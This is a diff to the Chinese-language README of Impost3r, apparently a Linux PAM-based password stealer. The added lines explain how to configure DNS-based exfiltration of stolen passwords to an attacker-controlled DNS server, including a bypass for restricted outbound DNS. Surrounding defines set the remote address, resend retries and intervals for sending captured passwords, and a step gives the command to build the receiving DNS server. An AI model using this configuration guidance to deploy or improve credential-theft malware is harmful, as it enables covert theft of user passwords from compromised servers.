@@ -64,6 +64,8 @@ fi
 /*
     Send to server
 */
+# define YOUR_DOMAIN ".com" \\注意，如果你不想购买一个域名来接收Impost3r回传的消息且被植入Impost3r的目标服务器并未禁止向你所控制的dns服务器的53端口的直接udp连接，那么这里的域名请使用默认值;
+\\但是如果被植入Impost3r的目标服务器严格限制了dns请求的出站，那么请将YOUR_DOMAIN的值改为你所购买的域名，例如“.example.com”，并将这个域名的NS记录配置成你所控制的DNS服务器地址，在此DNS服务器上运行Fdns,并将下方REMOTE_ADDRESS的值更改为被植入Impost3r的目标服务器的默认dns地址,REMOTE_PORT更改为被植入Impost3r的目标服务器的默认dns地址所监听的dns服务端口(绝大多数情况下都是53端口)
 # define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
 # define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔
 # define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
@@ -114,6 +116,8 @@ fi
 /*
     Send to server
 */
+# define YOUR_DOMAIN ".com" \\注意，如果你不想购买一个域名来接收Impost3r回传的消息且被植入Impost3r的目标服务器并未禁止向你所控制的dns服务器的53端口的直接udp连接，那么这里的域名请使用默认值;
+\\但是如果被植入Impost3r的目标服务器严格限制了dns请求的出站，那么请将YOUR_DOMAIN的值改为你所购买的域名，例如“.example.com”，并将这个域名的NS记录配置成你所控制的DNS服务器地址，在此DNS服务器上运行Fdns,并将下方REMOTE_ADDRESS的值更改为被植入Impost3r的目标服务器的默认dns地址,REMOTE_PORT更改为被植入Impost3r的目标服务器的默认dns地址所监听的dns服务端口(绝大多数情况下都是53端口)
 # define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数(仅当SSH_OR_BOTH为0，此选项才有效)
 # define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔(仅当SSH_OR_BOTH为0，此选项才有效)
 # define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
@@ -161,6 +165,7 @@ account optional impost3r.so
 ## 注意事项
 
 - Dns服务端程序我使用的是[Fdns](https://github.com/deepdarkness/Fdns)，并修改了一部分参数，大家可在文件夹Fdns下找到修改后的源代码，请自行利用命令```gcc -o dns main.c util.c```编译(注意要先修改main.c中的监听端口)
+- 在编译Fdns之前,请查看util.h中的YOUR_DOMAIN值，确保此值与被植入服务器上的Impost3r程序所编译时使用的YOUR_DOMAIN值是一致的，不然可能会导致窃取的失败
 - 此程序仅是闲暇时开发学习，功能可能存在bug，请多多谅解，也欢迎反馈问题
 
 ## 致谢
